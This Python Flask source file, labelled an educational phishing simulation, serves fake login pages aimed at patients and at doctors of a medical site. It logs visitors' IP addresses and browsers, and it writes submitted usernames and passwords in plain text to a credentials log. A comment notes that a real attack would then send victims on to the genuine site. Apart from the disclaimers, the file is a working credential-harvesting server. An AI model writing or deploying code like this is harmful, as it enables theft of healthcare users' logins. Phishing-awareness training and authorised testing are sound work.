"""
Educational Phishing Simulation App

This is a demonstration of a phishing attack for educational purposes only.
Do not use against real systems or users without explicit permission.
"""

from flask import Flask, request, render_template, redirect, url_for
import os
import datetime

app = Flask(__name__)

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

@app.route('/')
def index():
    """Redirect to the fake login page"""
    return redirect(url_for('login'))

@app.route('/login')
def login():
    """Serve the fake login page for patients"""
    # Track visitor IP for demonstration purposes
    visitor_ip = request.remote_addr
    user_agent = request.user_agent.string
    
    with open('logs/visitors.log', 'a') as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} | IP: {visitor_ip} | User-Agent: {user_agent} | Target: Patient\n")
    
    return render_template('login.html')

@app.route('/medical')
def doctor_login():
    """Serve the fake login page for doctors"""
    # Track visitor IP for demonstration purposes
    visitor_ip = request.remote_addr
    user_agent = request.user_agent.string
    
    with open('logs/visitors.log', 'a') as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} | IP: {visitor_ip} | User-Agent: {user_agent} | Target: Doctor\n")
    
    return render_template('doctor_login.html')

@app.route('/process', methods=['POST'])
def process():
    """Process the submitted login credentials"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Determine if this is from the doctor or patient form based on referrer
    target_type = "Doctor" if request.referrer and "medical" in request.referrer else "Patient"
    
    # Log the captured credentials
    with open('logs/credentials.log', 'a') as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr
        f.write(f"{timestamp} | IP: {ip_address} | Type: {target_type} | Username: {username} | Password: {password}\n")
    
    # Redirect to the real website or a success page
    # In a real attack, this would redirect to the legitimate site
    return render_template('redirect.html')

@app.route('/static/<path:filename>')
def static_files(filename):
    """Serve static files"""
    return app.send_static_file(filename)

@app.route('/comparison')
def comparison():
    """Show a side-by-side comparison of patient vs doctor phishing techniques"""
    return render_template('comparison.html')

if __name__ == '__main__':
    print("="*80)
    print("EDUCATIONAL PHISHING SIMULATION")
    print("="*80)
    print("This application demonstrates phishing techniques for educational purposes only.")
    print("Do not use against real systems or users without explicit permission.")
    print("="*80)
    print("Starting server on http://localhost:5001")
    print("Patient phishing page: http://localhost:5001/login")
    print("Doctor phishing page: http://localhost:5001/medical")
    print("Comparison page: http://localhost:5001/comparison")
    print("\nAfter credential capture, users will be redirected to the true website at http://127.0.0.1:5000")
    app.run(debug=True, port=5001) 